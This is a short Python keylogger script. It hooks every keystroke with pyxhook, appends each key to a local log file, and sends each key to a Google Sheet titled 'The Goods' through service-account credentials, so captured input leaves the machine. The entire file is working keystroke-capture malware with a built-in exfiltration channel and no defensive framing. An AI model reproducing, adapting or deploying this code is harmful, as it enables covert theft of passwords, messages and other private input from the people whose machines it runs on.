import pyxhook
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import time
#change this to your log file's path
try:
	log_file='/home/orangehoopla/Desktop/Python-stuff/py-keylogger/quade.log'

	scope = ['https://spreadsheets.google.com/feeds']
	creds = ServiceAccountCredentials.from_json_keyfile_name('shen.json',scope)
	client = gspread.authorize(creds)
	sheet = client.open('The Goods').sheet1
	red = 2

	#this function is called everytime a key is pressed.
	def OnKeyPress(event):
	  global red
	  fob=open(log_file,'a')
	  fob.write(event.Key)
	  fob.write('\n')
	  sheet.update_cell(red,1,event.Key)
	  red += 1
	  if event.Ascii==96: #96 is the ascii value of the grave key (`)
	    fob.close()
	    new_hook.cancel()
	#instantiate HookManager class
	new_hook=pyxhook.HookManager()
	#listen to all keystrokes
	new_hook.KeyDown=OnKeyPress
	#hook the keyboard
	new_hook.HookKeyboard()
	#start the session
	new_hook.start()

except:
	time.sleep(30)


